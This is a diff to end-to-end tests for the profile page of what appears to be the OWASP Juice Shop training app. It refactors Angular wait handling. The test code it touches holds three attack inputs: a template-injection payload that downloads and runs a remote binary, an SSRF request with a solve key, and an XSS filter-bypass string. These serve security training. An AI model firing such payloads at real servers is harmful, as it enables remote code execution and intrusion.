@@ -3,6 +3,13 @@ const utils = require('../../lib/utils')
 
 describe('/profile', () => {
   let username, submitButton, url, setButton
+  beforeEach(() => {
+    browser.waitForAngularEnabled(false)
+  })
+
+  afterEach(() => {
+    browser.waitForAngularEnabled(true)
+  })
 
   if (!utils.disableOnContainerEnv()) {
     describe('challenge "SSTi"', () => {
@@ -11,14 +18,12 @@ describe('/profile', () => {
 
       xit('should be possible to inject arbitrary nodeJs commands in username', () => {
         browser.get('/profile')
-        browser.waitForAngularEnabled(false)
         username = element(by.id('username'))
         submitButton = element(by.id('submit'))
         username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
         submitButton.click()
         browser.get('/')
         browser.driver.sleep(5000)
-        browser.waitForAngularEnabled(true)
       })
       // protractor.expect.challengeSolved({ challenge: 'SSTi' })
     })
@@ -30,14 +35,12 @@ describe('/profile', () => {
 
     xit('should be possible to request internal resources using image upload URL', () => {
       browser.get('/profile')
-      browser.waitForAngularEnabled(false)
       url = element(by.id('url'))
       submitButton = element(by.id('submitUrl'))
       url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
       submitButton.click()
       browser.get('/')
       browser.driver.sleep(5000)
-      browser.waitForAngularEnabled(true)
     })
     // protractor.expect.challengeSolved({ challenge: 'SSRF' })
   })
@@ -48,7 +51,6 @@ describe('/profile', () => {
     it('Username field should be susceptible to XSS attacks', () => {
       const EC = protractor.ExpectedConditions
       browser.get('/profile')
-      browser.waitForAngularEnabled(false)
       username = element(by.id('username'))
       setButton = element(by.id('submit'))
       username.sendKeys('<<a|ascript>alert(`xss`)</script>')
@@ -61,7 +63,6 @@ describe('/profile', () => {
       browser.driver.sleep(5000)
       username.sendKeys('wurstbrot') // disarm XSS
       setButton.click()
-      browser.waitForAngularEnabled(true)
     })
     protractor.expect.challengeSolved({ challenge: 'XSS Tier 1.5' })
   })
